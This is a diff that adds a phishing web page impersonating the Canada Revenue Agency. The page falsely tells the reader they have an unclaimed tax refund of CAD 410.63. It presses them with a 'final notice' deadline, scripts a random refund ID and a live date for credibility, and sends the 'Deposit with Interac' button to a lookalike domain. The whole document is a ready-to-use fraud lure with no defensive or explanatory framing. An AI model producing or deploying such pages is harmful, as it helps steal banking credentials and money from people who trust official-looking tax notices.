@@ -1,0 +1,147 @@
+ <!DOCTYPE html>
+
+<html class="no-js" dir="ltr" lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta charset="utf-8"/>
+<title>Canada Revenue Agency - Canada.ca</title>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<link rel="shortcut icon" href="theme/favicon.ico">
+<Style>
+@font-face { font-family: "Noto Sans"; src: url("https://fonts.gstatic.com/s/notosans/v25/o-0IIpQlx3QUlC5A4PNr5TRA.woff2") format("woff2"); font-style: normal; font-weight: 400; font-display: fallback; unicode-range: U+0-FF, U+131, U+152-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }
+
+
+body { font-family: "Noto Sans"; font-size:14px; }
+
+.main { 
+	padding: 15px;
+	border: 2px solid #26374A;
+	border-radius: 10px;
+	background-color:#e6e6e608;
+	margin-right:5px;
+}
+hr {
+	border-top: 0;
+	border-radius: 0;
+	border-bottom: 1px solid #26374A;
+}
+
+h2 {
+	border-bottom: 1px solid #af3c43;
+}
+
+button { border: 1px solid #26374A; background: #26374A; height: 32px; width: 70%; color:white; font-size:16px; border-radius: 5px; }
+</style>
+</head>
+<body>
+<div class="main">
+
+<Br>
+<div style="width:100%; display:block">
+<div style="display:inline-block;float:left;width:50%;">
+<img src="theme-logo.png" style="width:100%">
+</div>
+<div style="display:inline-block;float:right;color:grey;font-size:13px;width:50%;text-align:right;">
+Canada Revenue Agency<br>
+333 Laurier Avenue West<br>
+Ottawa ON  K1A 0L9<br>
+Fax: 613- 952-1982<br>
+</div>
+</div>
+<Br><Br><Br><Br><Br>
+
+<Br>
+<h2>Strictly Private and Confidential</h2>
+<h3 style="margin-top:-10px;">Final reminder to redeem </h3><Br>
+<Br>
+Tax year 10/01/2022 to <span id="digital-clock"></span> (2022-23) 
+<Br><Br>
+Tax refund Local<Br>
+Office No. 805445<Br>
+Tax Refund ID Number: 0544<script>
+function randomString(length, chars) {
+    var mask = '';
+    if (chars.indexOf('a') > -1) mask += 'abcdefghijklmnopqrstuvwxyz';
+    if (chars.indexOf('A') > -1) mask += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    if (chars.indexOf('#') > -1) mask += '0123456789';
+    if (chars.indexOf('!') > -1) mask += '~`!@#$%^&*()_+-={}[]:";\'<>?,./|\\';
+    var result = '';
+    for (var i = length; i > 0; --i) result += mask[Math.round(Math.random() * (mask.length - 1))];
+    return result;
+}
+
+document.write(randomString(8, '###'));
+</script><Br>
+Refund Amount: <strong>CAD 410.63</strong> <Br>
+<Br>
+We recently identified an unclaimed amount of <strong>$410.63</strong> from your last tax return.<br>
+We have been attempting to reach you to no avail, so we are sending you this correspondence as a final notice. <br>
+<br>
+<br>
+To claim the unclaimed amount, we have partnered with Interac to make it easier and faster for <br>
+you to receive your funds quicker than ever before. <br>
+<br>
+<button onclick="window.location.href='https://www.secureaccntretrn-cra.com';" type="button" >Deposit with Interac</button>
+<br>
+<br>
+<br>
+Please be aware that if we do not hear from you before your next tax return, it will be impossible to claim this amount in the future. <br>
+<br>
+<br>
+If you have any questions or need assistance or for further information on personal,business,<br>
+ corporation and trust income tax.<br><br><button  onclick="location.href='https://www.canada.ca/en/revenue-agency/services/e-services/cra-login-services.html';" type="button" >CRA sign in</button><br>
+<br>
+<br>
+<br>
+Sincerely,<br>
+
+<div style="font-size:14px;">
+<b>The Canada Revenue Agency</b><Br>
+<img src="theme/sigleft.jpg">
+</div>
+
+<br><br>
+<div style="font-size:11.6px;color:#333;">
+CONFIDENTIALITY NOTICE: This communication, including any attachments is for the exclusive and confidential use of the intended recipient(s) and may contain information that is priviledged, confidential or exempt from disclosure under applicable law. If you are not the intended recipient, please immediately notify the sender by reply email and destroy all copies of the original message.
+<br>
+<br>
+<img src="theme/elogo.png" style="height:70px;">
+</div>
+</div>
+<br>
+<script>
+function getDateTime() {
+        var now     = new Date(); 
+        var year    = now.getFullYear();
+        var month   = now.getMonth()+1; 
+        var day     = now.getDate();
+        var hour    = now.getHours();
+        var minute  = now.getMinutes();
+        var second  = now.getSeconds(); 
+        if(month.toString().length == 1) {
+             month = '0'+month;
+        }
+        if(day.toString().length == 1) {
+             day = '0'+day;
+        }   
+        if(hour.toString().length == 1) {
+             hour = '0'+hour;
+        }
+        if(minute.toString().length == 1) {
+             minute = '0'+minute;
+        }
+        if(second.toString().length == 1) {
+             second = '0'+second;
+        }   
+        var dateTime = month+'/'+day+'/'+year+' '+hour+':'+minute+':'+second;   
+         return dateTime;
+    }
+
+    // example usage: realtime clock
+ <!--    setInterval(function(){ -->
+        currentTime = getDateTime();
+        document.getElementById("digital-clock").innerHTML = currentTime;
+ <!--    }, 0100); -->
+</script>
+</body>
+</html>
